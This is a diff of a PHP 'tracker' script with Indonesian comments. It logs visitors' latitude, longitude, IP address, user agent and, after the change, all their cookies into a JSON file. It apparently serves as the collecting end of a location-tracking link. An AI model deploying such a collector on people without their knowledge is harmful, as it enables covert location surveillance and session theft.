@@ -1,13 +1,21 @@
 <?php
 // Nama file log untuk menyimpan data lokasi
-$log_file = 'tracker_log.txt';
+$log_file = 'tracker_log.json';
 
 // Fungsi untuk menulis log ke file
 function write_log($data) {
     global $log_file;
-    $fp = fopen($log_file, 'a');
-    fwrite($fp, $data . "\n");
-    fclose($fp);
+    // Membaca file log yang ada
+    $current_logs = [];
+    if (file_exists($log_file)) {
+        $current_logs = json_decode(file_get_contents($log_file), true);
+    }
+    
+    // Menambahkan data baru ke array log
+    $current_logs[] = $data;
+    
+    // Menulis data log ke file dalam format JSON
+    file_put_contents($log_file, json_encode($current_logs, JSON_PRETTY_PRINT));
 }
 
 // Mengambil data dari permintaan POST
@@ -17,14 +25,15 @@ $browser = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'U
 $ip = $_SERVER['REMOTE_ADDR'];
 $cookie = isset($_COOKIE) ? json_encode($_COOKIE) : 'No Cookies';
 
-// Menyusun data log dalam format Apache
-$log_data = sprintf("[%s] \"%s\" \"%s\" \"%s\" \"%s\"\n",
-    date('d/M/Y:H:i:s O'),
-    $ip,
-    $latitude,
-    $longitude,
-    $browser
-);
+// Menyusun data log dalam format JSON
+$log_data = [
+    'timestamp' => date('d/M/Y:H:i:s O'),
+    'ip_address' => $ip,
+    'latitude' => $latitude,
+    'longitude' => $longitude,
+    'user_agent' => $browser,
+    'cookies' => $cookie
+];
 
 // Menulis data log ke file
 write_log($log_data);
